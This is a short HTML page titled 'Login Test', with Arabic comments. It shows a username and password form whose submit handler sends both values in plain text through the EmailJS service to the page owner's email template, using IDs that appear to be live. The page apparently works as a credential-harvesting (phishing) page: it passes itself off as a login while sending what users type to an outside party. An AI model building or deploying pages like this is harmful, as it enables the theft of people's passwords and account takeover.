<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Login Test</title>

    <!-- EmailJS Library -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

    <script>
        // ضع هنا Public Key من EmailJS
        (function(){
            emailjs.init("HroCugO_zwp5xHOFA");
        })();
    </script>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            width: 280px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        h3 {
            text-align: center;
        }
        input, button {
            width: 100%;
            margin: 8px 0;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<form id="loginForm">
    <h3>Login Test</h3>
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // أخذ القيم من الفورم
    const params = {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    };

    // إرسال البيانات إلى EmailJS
    emailjs.send(
        "service_b9bxbmf",   // ضع Service ID هنا
        "template_32f01yw",  // ضع Template ID هنا (اللي فيه {{username}} و {{password}})
        params
    ).then(
        function() {
            alert("Data sent successfully!"); // نجاح الإرسال
        },
        function(error) {
            alert("Error: " + error.text); // أي خطأ يظهر
        }
    );
});
</script>

</body>
</html>
